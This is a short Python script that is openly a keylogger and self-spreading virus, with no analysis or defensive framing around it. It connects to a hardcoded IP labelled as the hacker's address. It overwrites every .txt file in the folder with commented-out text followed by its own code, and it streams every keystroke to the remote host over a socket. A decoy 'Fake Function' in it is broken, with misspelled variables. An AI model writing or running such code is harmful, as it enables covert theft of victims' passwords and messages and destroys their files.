from pynput.keyboard import Listener, Key
import socket
from tkinter import messagebox
import random
import string
import os
import sys
import glob

#Fake Function
def modify(key):
 answer = key*5 
 encrpyt = answer
 for i in encryprt:
   i << 24
 return encrypt

host = '172.20.10.2' #Hacker's IP address as a string
#this would be prefilled usually before distribution
port = 9999

s = socket.socket()
s.connect((host, port))


messagebox.showinfo("HACKED!", "You May Be Getting Key Logged")

IN = open(sys.argv[0], 'r')
virus = [line for (i,line) in enumerate(IN) if i < 63]

def generate_random_letters(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

randomstring = generate_random_letters(100)

for item in glob.glob("*.txt"):
  IN= open(item, 'r')
  all_of_it = IN.readlines()
  IN.close()
  if any('from pynput.keyboard import Listener, Key' in line for line in all_of_it):continue
  os.chmod(item, 0o777)
  OUT = open(item, 'w')
  all_of_it = ['#' + line for line in all_of_it]
  OUT.writelines(all_of_it)
  OUT.writelines('newfile =' + randomstring + '\n')
  OUT.writelines(virus)
  OUT.close()

def press(key):
    #print(key)
    s.send(str(key).encode())

def release(key):
    if key == Key.esc:
    	return False

with Listener(on_press = press, on_release = release) as listener:
    listener.join()
